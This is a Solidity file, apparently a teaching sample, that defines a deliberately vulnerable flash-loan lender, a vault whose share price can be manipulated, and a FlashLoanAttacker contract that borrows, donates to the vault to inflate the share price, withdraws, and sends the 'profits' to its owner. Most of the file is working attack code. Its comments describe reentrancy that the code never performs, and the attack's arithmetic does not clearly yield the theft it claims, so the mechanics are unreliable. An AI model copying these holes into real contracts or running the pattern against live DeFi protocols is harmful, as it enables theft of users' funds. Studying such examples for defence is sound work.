// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title FlashLoanReentrancy
 * @notice EXAMPLE VULNERABLE CONTRACT - DO NOT USE IN PRODUCTION
 * @dev Demonstrates reentrancy through flash loan callbacks
 *      Similar to DFX Finance and other flash loan exploits.
 */

interface IFlashLoanReceiver {
    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata params
    ) external returns (bool);
}

/**
 * @title VulnerableFlashLender
 * @notice Flash loan provider vulnerable to reentrancy
 */
contract VulnerableFlashLender {
    mapping(address => uint256) public deposits;
    uint256 public totalDeposits;
    
    // Flash loan fee: 0.1%
    uint256 public constant FLASH_LOAN_FEE = 10; // basis points
    
    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event FlashLoan(address indexed receiver, uint256 amount, uint256 fee);
    
    /**
     * @notice Deposit ETH into the pool
     */
    function deposit() external payable {
        require(msg.value > 0, "Must deposit something");
        deposits[msg.sender] += msg.value;
        totalDeposits += msg.value;
        emit Deposited(msg.sender, msg.value);
    }
    
    /**
     * @notice Withdraw deposited ETH
     */
    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "Insufficient balance");
        
        deposits[msg.sender] -= amount;
        totalDeposits -= amount;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        emit Withdrawn(msg.sender, amount);
    }
    
    /**
     * @notice Execute a flash loan
     * @dev VULNERABLE: Callback before state validation allows reentrancy
     */
    function flashLoan(
        address receiver,
        uint256 amount,
        bytes calldata params
    ) external {
        require(amount <= address(this).balance, "Insufficient liquidity");
        
        uint256 balanceBefore = address(this).balance;
        uint256 fee = (amount * FLASH_LOAN_FEE) / 10000;
        
        // Send funds to receiver
        (bool sent, ) = receiver.call{value: amount}("");
        require(sent, "Flash loan transfer failed");
        
        // VULNERABILITY: Callback to potentially malicious contract
        // The receiver can re-enter this contract during the callback
        bool success = IFlashLoanReceiver(receiver).executeOperation(
            address(0), // ETH
            amount,
            fee,
            params
        );
        require(success, "Flash loan callback failed");
        
        // Check repayment - but attacker may have manipulated state
        require(
            address(this).balance >= balanceBefore + fee,
            "Flash loan not repaid"
        );
        
        emit FlashLoan(receiver, amount, fee);
    }
    
    /**
     * @notice Get available liquidity
     */
    function getAvailableLiquidity() external view returns (uint256) {
        return address(this).balance;
    }
    
    receive() external payable {}
}


/**
 * @title VulnerableVault
 * @notice Vault that can be exploited via flash loan reentrancy
 */
contract VulnerableVault {
    VulnerableFlashLender public flashLender;
    
    mapping(address => uint256) public shares;
    uint256 public totalShares;
    uint256 public totalAssets;
    
    event Deposit(address indexed user, uint256 assets, uint256 shares);
    event Withdraw(address indexed user, uint256 assets, uint256 shares);
    
    constructor(address _flashLender) {
        flashLender = VulnerableFlashLender(payable(_flashLender));
    }
    
    /**
     * @notice Deposit assets and receive shares
     */
    function depositAssets() external payable returns (uint256 shareAmount) {
        uint256 assets = msg.value;
        require(assets > 0, "Must deposit something");
        
        if (totalShares == 0) {
            shareAmount = assets;
        } else {
            shareAmount = (assets * totalShares) / totalAssets;
        }
        
        shares[msg.sender] += shareAmount;
        totalShares += shareAmount;
        totalAssets += assets;
        
        emit Deposit(msg.sender, assets, shareAmount);
        return shareAmount;
    }
    
    /**
     * @notice Withdraw assets by burning shares
     * @dev VULNERABLE: Uses current price which can be manipulated
     */
    function withdrawAssets(uint256 shareAmount) external returns (uint256 assets) {
        require(shares[msg.sender] >= shareAmount, "Insufficient shares");
        
        // Calculate assets based on current price
        // This can be manipulated via flash loan!
        assets = (shareAmount * totalAssets) / totalShares;
        
        shares[msg.sender] -= shareAmount;
        totalShares -= shareAmount;
        totalAssets -= assets;
        
        // External call - potential reentrancy point
        (bool success, ) = msg.sender.call{value: assets}("");
        require(success, "Transfer failed");
        
        emit Withdraw(msg.sender, assets, shareAmount);
        return assets;
    }
    
    /**
     * @notice Get share price
     * @dev Can return manipulated value during flash loan
     */
    function getSharePrice() public view returns (uint256) {
        if (totalShares == 0) return 1e18;
        return (totalAssets * 1e18) / totalShares;
    }
    
    /**
     * @notice Preview withdrawal amount
     */
    function previewWithdraw(uint256 shareAmount) public view returns (uint256) {
        if (totalShares == 0) return 0;
        return (shareAmount * totalAssets) / totalShares;
    }
    
    receive() external payable {
        totalAssets += msg.value;
    }
}


/**
 * @title FlashLoanAttacker
 * @notice Exploits flash loan callback for reentrancy
 */
contract FlashLoanAttacker is IFlashLoanReceiver {
    VulnerableFlashLender public flashLender;
    VulnerableVault public vault;
    address public owner;
    
    uint256 public attackPhase;
    uint256 public stolenAmount;
    
    constructor(address _flashLender, address _vault) {
        flashLender = VulnerableFlashLender(payable(_flashLender));
        vault = VulnerableVault(payable(_vault));
        owner = msg.sender;
    }
    
    /**
     * @notice Execute the flash loan attack
     */
    function attack() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need initial capital");
        
        // Step 1: Deposit into vault to get shares
        uint256 initialShares = vault.depositAssets{value: msg.value}();
        
        // Step 2: Take flash loan to manipulate price
        attackPhase = 1;
        uint256 loanAmount = flashLender.getAvailableLiquidity();
        flashLender.flashLoan(address(this), loanAmount, "");
    }
    
    /**
     * @notice Flash loan callback - reentrancy happens here
     */
    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata params
    ) external override returns (bool) {
        require(msg.sender == address(flashLender), "Invalid caller");
        
        if (attackPhase == 1) {
            // During flash loan, we have extra ETH
            // This can be used to manipulate vault's share price
            
            // Donate to vault to inflate share price
            (bool success, ) = address(vault).call{value: amount / 2}("");
            
            // Now withdraw our shares at inflated price
            uint256 myShares = vault.shares(address(this));
            if (myShares > 0) {
                uint256 withdrawn = vault.withdrawAssets(myShares);
                stolenAmount = withdrawn;
            }
        }
        
        // Repay flash loan + fee
        uint256 repayAmount = amount + fee;
        (bool repaid, ) = address(flashLender).call{value: repayAmount}("");
        require(repaid, "Repayment failed");
        
        return true;
    }
    
    function collectProfits() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
    
    receive() external payable {}
}
